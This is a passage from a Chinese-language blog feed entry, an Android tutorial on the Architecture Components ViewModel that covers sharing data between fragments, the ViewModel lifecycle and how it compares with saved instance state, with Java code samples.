&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loadUsers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// do async operation to fetch users</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在 activity 中不再直接持有 user list :</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        MyViewModel model = ViewModelProviders.of(<span class="keyword">this</span>).get(MyViewModel.class);</span><br><span class="line">        model.getUsers().observe(<span class="keyword">this</span>, users -&gt; &#123;</span><br><span class="line">            <span class="comment">// update UI</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Activity 重建后，会得到同一个 MyViewModel 实例。</li><li>Activity 销毁后, ViewModel.onCleared()会自动清理。</li><li>ViewModel不应该持有任何View，或者Activity context，如果需要Application context，可以让ViewModel继承<code>AndroidViewModel</code>。</li></ol><h3 id="在-fragments-之间共享数据">在 Fragments 之间共享数据</h3><p>现在可以通过同一个activity 的 ViewModel来共享数据。不用再抽象fragment interface、bind 到activity、处理fragment生命周期。。。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SharedViewModel</span> <span class="keyword">extends</span> <span class="title">ViewModel</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MutableLiveData&lt;Item&gt; selected = <span class="keyword">new</span> MutableLiveData&lt;Item&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">(Item item)</span> </span>&#123;</span><br><span class="line">        selected.setValue(item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LiveData&lt;Item&gt; <span class="title">getSelected</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> selected;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MasterFragment</span> <span class="keyword">extends</span> <span class="title">Fragment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SharedViewModel model;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        model = ViewModelProviders.of(getActivity()).get(SharedViewModel.class);</span><br><span class="line">        itemSelector.setOnClickListener(item -&gt; &#123;</span><br><span class="line">            model.select(item);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DetailFragment</span> <span class="keyword">extends</span> <span class="title">LifecycleFragment</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        SharedViewModel model = ViewModelProviders.of(getActivity()).get(SharedViewModel.class);</span><br><span class="line">        model.getSelected().observe(<span class="keyword">this</span>, &#123; item -&gt;</span><br><span class="line">           <span class="comment">// update UI</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中的两个<br>fragments都通过</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ViewModelProviders.of(getActivity()).get(SharedViewModel.class);</span><br></pre></td></tr></table></figure><p>获取了同一个基于<code>getActivity</code> 的ViewModel 实例。</p><p>优点:</p><ul><li>activity不用再操心fragment之间的数据共享了。</li><li>Fragments 也不需要知晓除了<code>SharedViewModel</code>之外的内部的实现细节，即使其中一个fragment消失，另外的fragment还是可以照常工作。</li><li>每个 fragment 的生命周期都是独立的，互不影响。</li></ul><h3 id="viewmodel的生命周期">ViewModel的生命周期</h3><p><code>ViewModel</code> 的生命会绑定到调用<code>ViewModelProvider</code> 时传入的<code>Lifecycle</code>对象。直到<code>Lifecycle</code>对象永久的销毁了（<code>Activity.finish()</code>/<code>fragment.detach()</code>）， <code>ViewModel</code> 都一直keep在内存中。</p><p><img src="/media/viewmodel-lifecycle.png" alt=""></p><h3 id="viewmodel-vs-savedinstancestate">ViewModel vs SavedInstanceState</h3><p>ViewModels 会在 configuration changes 时维持数据，但在系统kill应用时不会将数据持久化到本地。</p><p>举例说明，如果用户离开应用，几个小时后再回来，应用进程这时已经被系统kill，之前打开的Activity会根据save state重建现场。<br>所有的系统组件都会在<code>SaveInstanceState</code> 中保存状态， 你也可以在<code>onSaveInstanceState</code>中增加自己的数据。</p><p><code>onSaveInstanceState</code>中存储的数据保存在系统进程的内存空间中，因此能存储的数据大小有限。</p><blockquote><p>1.binder transaction: 1MB</p></blockquote><blockquote><p>The Binder transaction buffer has a limited fixed size, <strong>currently 1Mb</strong>, which is shared by all transactions in progress for the process. Consequently this exception can be thrown when there are many transactions in progress even when most of the individual transactions are of moderate size.</p></blockquote><blockquote><p>2.Saved Instance State</p></blockquote><blockquote><p>no doc etc.</p></blockquote><p>尽量不要用这个存储非UI相关的数据。比如，用户通过UI查询一个国家的数据，这时候，放到saved instance state中的应该是<code>countryId</code>而不是<code>Country</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将介绍Architecture Components中的ViewModel组件&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://deskid.github.io/tags/Android/"/>
    
  </entry>
  
</feed>
